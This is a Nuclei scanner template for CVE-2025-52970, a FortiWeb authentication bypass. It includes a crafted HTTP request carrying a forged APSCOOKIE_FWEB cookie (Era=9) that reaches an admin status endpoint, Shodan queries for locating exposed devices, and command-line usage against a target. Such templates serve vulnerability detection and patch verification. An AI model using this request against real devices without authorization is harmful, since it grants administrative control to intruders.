id: CVE-2025-52970

info:
  name: Fortinet FortiWeb - Authentication Bypass
  author: Excellencedev
  severity: high
  description: |
    Fortinet FortiWeb versions 7.6.3 and below, 7.4.7 and below, 7.2.10 and below, and 7.0.10 and below contain a broken access control vulnerability caused by improper handling of the APSCOOKIE_FWEB cookie parameters. By supplying an out-of-range Era value (e.g., 9), the backend may select a zero/NULL key for both encryption and signing, enabling impersonation of an existing user. This allows unauthenticated remote attackers with non-public device information to gain administrative privileges via crafted requests.
  impact: |
    Unauthenticated remote attackers can gain administrative privileges, leading to full control over the device.
  remediation: |
    Update to a version later than 7.6.3, 7.4.7, 7.2.10, or 7.0.10 or the latest available version.
  reference:
    - https://pwner.gg/blog/2025-08-13-fortiweb-cve-2025-52970
    - https://fortiguard.fortinet.com/psirt/FG-IR-25-448
    - https://nvd.nist.gov/vuln/detail/CVE-2025-52970
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2025-52970
    cwe-id: CWE-233
    epss-score: 0.00322
    epss-percentile: 0.54615
    cpe: cpe:2.3:a:fortinet:fortiweb:*:*:*:*:*:*:*:*
  metadata:
    verified: false
    max-request: 1
    vendor: fortinet
    product: fortiweb
    shodan-query:
      - ssl:"cn=fortiweb"
      - title:"FortiWeb - "
  tags: cve,cve2025,fortinet,fortiweb,auth-bypass

http:
  - raw:
      - |
        GET /api/v2.0/system/status.systemstatus HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Connection: close
        Cookie: APSCOOKIE_FWEB_{{aps_magic}}=Era=9&Payload={{payload}}&AuthHash={{authhash}}

    matchers-condition: and
    matchers:

      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "Content-Type: application/json"

      - type: word
        part: body
        words:
          - '"results"'
          - '"hostName"'
          - '"operationMode"'
          - '"firmwareVersion"'
          - '"administrativeDomain"'
        condition: and

    # Usage:
    #   nuclei -t http/cves/2025/CVE-2025-52970.yaml -u https://<target> \
    #     -var aps_magic=8672793038565212270 \
    #     -var payload=<base64-ciphertext> \
    #     -var authhash=<base64-hmac-sha1>

# This template requires precomputed cookie values and a target with an active session.
# For acceptance, attach nuclei -debug output showing the actual exploited response containing the
# 'results' object fields as demonstrated in the reference PoC.
